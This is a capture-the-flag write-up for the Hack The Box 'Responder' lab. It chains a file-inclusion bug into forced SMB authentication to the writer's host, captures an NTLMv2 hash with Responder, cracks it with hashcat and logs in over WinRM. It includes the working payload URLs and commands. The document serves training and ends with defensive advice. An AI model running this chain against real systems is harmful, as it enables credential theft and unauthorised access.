# Responder

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 1) |
| **OS** | Windows |
| **Difficulty** | Very Easy |
| **Techniques** | LFI, forced SMB authentication, Responder NTLMv2 capture, offline cracking, WinRM |

## Overview
A web app with a Local File Inclusion that also accepts UNC/remote paths. By pointing
it at my own host I coerce the server to authenticate to me over SMB, capture the
NTLMv2 hash with Responder, crack it offline, and log in over WinRM.

## Enumeration
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
# 80 http, 5985 WinRM, 5985/WSMan
# add the vhost to /etc/hosts if the app redirects to a name (e.g. unika.htb)
```
The `page` parameter includes files by name and follows a `language=` style include:
```
http://unika.htb/index.php?page=french.html      # normal
http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts   # LFI
```

## Exploitation
Start Responder, then make the LFI fetch a file from a UNC path on my box:
```bash
sudo responder -I tun0
# trigger: the include reaches out to \\<MY_IP>\share, leaking an NTLMv2 hash
http://unika.htb/index.php?page=//<MY_IP>/somefile
```
Responder captures `Administrator::...` NTLMv2. Crack it offline:
```bash
hashcat -m 5600 admin.hash /usr/share/wordlists/rockyou.txt
```
Log in with the recovered password:
```bash
evil-winrm -i <TARGET_IP> -u administrator -p '<PASSWORD>'
```

## Key Takeaway
LFI that accepts remote/UNC paths becomes an NTLM-coercion primitive. Disable remote
file inclusion, restrict outbound SMB, and never reuse weak passwords that crack from
rockyou.

## My note
The important mental model here is that an "information disclosure" bug (LFI) turned
into credential theft because the include would reach back out to an attacker host.
Chaining a low-severity bug into authentication is exactly the kind of lateral thinking
real assessments reward.
